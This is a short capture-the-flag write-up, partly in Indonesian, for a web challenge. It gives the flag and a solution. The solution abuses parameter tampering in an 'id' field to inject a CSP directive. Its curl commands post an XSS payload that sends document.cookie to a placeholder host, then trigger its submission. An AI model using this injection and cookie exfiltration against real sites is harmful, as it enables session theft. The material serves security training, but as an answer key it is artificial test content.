# FLAG
`IFEST2021{0n_7h3_w4y_7o_F!nd_my_Si57er!!!_}`

# Description
Perkenalkan namaku adalah Katheryne, Aku adalah resepsio— \*skip\*

# Level
Medium

# Deploy
```
$ sudo ./build_docker.sh
```

# Solution
1. Terdapat Parameter Tampering di parameter id
2. Merubah parameter id untuk melakukan CSP Injection
```
$ curl -X 'POST' -H 'Content-Type: application/json' --data-raw $'{\"id\":\"b; script-src-elem \'unsafe-inline\'\",\"subject\":\"abc\",\"content\":\"<script>fetch(\'http://ipaddress:1234/?\'+document.cookie)</script>\"}' http://localhost:1337/open-commission```
```
3. Submit commission
```
$ curl -X 'POST' -H 'Content-Type: application/json' --data-raw $'{\"id\":\"b; script-src-elem \'unsafe-inline\'\"}' http://localhost:1337/submit-commission
```